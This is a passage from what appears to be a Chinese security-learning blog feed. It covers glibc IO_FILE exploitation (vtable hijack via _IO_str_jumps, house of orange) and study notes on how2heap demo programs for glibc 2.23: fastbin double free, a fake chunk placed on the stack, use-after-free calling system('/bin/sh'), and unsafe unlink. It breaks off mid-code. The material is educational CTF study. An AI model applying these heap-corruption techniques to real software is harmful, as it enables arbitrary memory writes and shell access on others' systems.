_IO_strfile;<br></code></pre></td></tr></table></figure><p>可以看到，它使用了<code>IO</code>结构体中的值当作函数地址来直接调用，如果满足条件，将直接将<code>fp-&gt;_s._free_buffer</code>当作<strong>函数指针</strong>来调用。<br>首先，仍然需要绕过之前的<code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查<code>_mode&lt;=0</code>以及<code>_IO_write_ptr&gt;_IO_write_base</code>进入到<code>_IO_OVERFLOW</code>中。<br>我们可以将<code>vtable</code>的地址覆盖成<code>_IO_str_jumps-8</code>，这样会使得<code>_IO_str_finish</code>函数成为了伪造的<code>vtable</code>地址的<code>_IO_OVERFLOW</code>函数（因为<code>_IO_str_finish</code>偏移为<code>_IO_str_jumps</code>中<code>0x10</code>，而<code>_IO_OVERFLOW</code>为<code>0x18</code>）。这个<code>vtable</code>（地址为<code>_IO_str_jumps-8</code>）可以绕过检查，因为它在<code>vtable</code>的地址段中。<br>构造好<code>vtable</code>之后，需要做的就是构造<code>IO FILE</code>结构体其他字段，以进入将<code>fp-&gt;_s._free_buffer</code>当作函数指针的调用：先构造<code>fp-&gt;_IO_buf_base</code>为<code>/bin/sh</code>的地址，然后构造<code>fp-&gt;_flags</code>不包含<code>_IO_USER_BUF</code>，它的定义为<code>#define _IO_USER_BUF 1</code>，即<code>fp-&gt;_flags</code>最低位为<code>0</code>。<br>最后构造<code>fp-&gt;_s._free_buffer</code>为<code>system_addr</code>或<code>one gadget</code>即可<code>getshell</code>。<br>由于<code>libc</code>中没有<code>_IO_str_jump</code>的符号，因此可以通过<code>_IO_str_jumps</code>是<code>vtable</code>中的倒数第二个表，用<code>vtable</code>的最后地址减去<code>0x168</code>定位</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p><img src="/../images/IO_FILE/3.png" alt="image-20250506192817097"></p><p>当进行unsortedbins_attack时，这里的 _IO_list_all 的值会被修改为top，因为IO_list_all包含IO_FILE和IO_str_jumps两个结构体，然后此时smallbin[4]的fd字段，这时候这个字段就会对应 ._chain的值——就是说，此时smallbins[4]的fd字段对应着_IO_FILE这个结构体，同时里面是被我们放入smallbin的topchunk，这时候只要布置topchunk就是在伪造IO_FILE</p><h2 id="stdin劫持实现任意地址写"><a href="#stdin劫持实现任意地址写" class="headerlink" title="stdin劫持实现任意地址写"></a>stdin劫持实现任意地址写</h2><p><code>_IO_2_1_stdin</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdin</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IO_FILE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heap_zh学习</title>
    <link href="/2025/03/27/how2heap-zh%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/27/how2heap-zh%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="how2heap-zh学习"><a href="#how2heap-zh学习" class="headerlink" title="how2heap_zh学习"></a>how2heap_zh学习</h1><p>堆刚入门，如有错误欢迎指正。源码取自</p><p><a href="https://github.com/xiaodian2/how2heap_zh">xiaodian2&#x2F;how2heap_zh: 用于学习各种堆利用技术的存储库。fork自shellphish&#x2F;how2heap，提供中文本地化翻译。</a></p><h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbins-dup"><a href="#fastbins-dup" class="headerlink" title="fastbins_dup"></a>fastbins_dup</h3><p>先放源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 fastbin 的 double free\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请了 3 个 chunk\n&quot;</span>);<br>    <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-type">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 malloc(8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 malloc(8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三个 malloc(8): %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们先 free %p.\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n&quot;</span>, a, b, a, a);<br>    <br>    <span class="hljs-type">char</span>* d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(d, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p\n&quot;</span>, f);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最简单的double_free，在double_free之后d和f都指向同一个堆，这个时候就可以写入free_hook什么的修改成system，然后free一个内容是“&#x2F;bin&#x2F;sh\x00”的指针的堆块就能拿shell</p><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p1, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p2, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先 free p1\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n&quot;</span>);<br>  <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p4, <span class="hljs-string">&quot;CCCCCCC&quot;</span>);<br>  <span class="hljs-type">void</span>* p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p5, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n&quot;</span>, p4, p5);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>原理：把p1从fastbins放入unsortedbins里面后就能再一次free p1，具体利用同fastbins_dup</p><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请3 个 chunk\n&quot;</span>);<br>    <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-type">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk a: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk b: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 chunk a\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先对 b %p 进行 free\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n&quot;</span>, a, b, a, a);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-type">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 表中只剩 [ %p ] 了\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n&quot;</span>, a);<br>    stack_var = <span class="hljs-number">0x20</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n&quot;</span>, a);<br>    *d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><br>    <span class="hljs-type">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n&quot;</span>, f);<br>    <span class="hljs-type">char</span>* g = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(g, <span class="hljs-string">&quot;GGGGGGGG&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这一次 malloc(8) 就申请到了栈上去: %p\n&quot;</span>, g);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>fastbins里的情况：</p><blockquote><p>double_free之后：a-&gt;b-&gt;a，第一次malloc：b-&gt;a，第二次malloc：a，</p></blockquote><p>这个时候再在栈上（或者其他可写区域）写入fake_chunk的size位，再把fake_chunk的地址写入d的fd地址，此时的fasterbins：</p><blockquote><p>a-&gt;ptr（fake_chunk的地址）</p></blockquote><p>再把a给malloc，下一次malloc就会把chunk申请到fake_chunk</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*func_ptr)</span><span class="hljs-params">(<span class="hljs-type">char</span> *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_fuc</span><span class="hljs-params">(<span class="hljs-type">char</span> command[])</span><br>&#123;<br>system(command);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">echo</span><span class="hljs-params">(<span class="hljs-type">char</span> content[])</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,content);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    func_ptr *p1=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请了4个int大小的内存&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    p1[<span class="hljs-number">1</span>]=echo;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;把p1[1]赋值为echo函数，然后打印出\&quot;hello world\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉 p1&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\&quot;hello again\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello again\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的&quot;</span>);<br>    func_ptr *p2=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 的地址: %p\n&quot;</span>,p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;然后把p2[1]给改成evil_fuc也就是system函数&quot;</span>);<br>    p2[<span class="hljs-number">1</span>]=evil_fuc;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;传参调用&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>c语言里面free函数调用后是不会清空块的，于是里面的指针可以再次调用。在把p2申请出来后就可以用add或者edit把p1块里面的内容修改掉。</p><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当您在已知位置有指向某个区域的指针时，可以调用 unlink\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//要足够大来避免进入 fastbin</span><br>    <span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n&quot;</span>);<br><br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;全局变量 chunk0_ptr 在 %p, 指向 %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想要破坏的 chunk 在 %p\n&quot;</span>, chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在 chunk0 那里伪造一个 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;next_free_chunk&#x27; (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;previous_free_chunk&#x27; (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过上面的设置可以绕过检查: 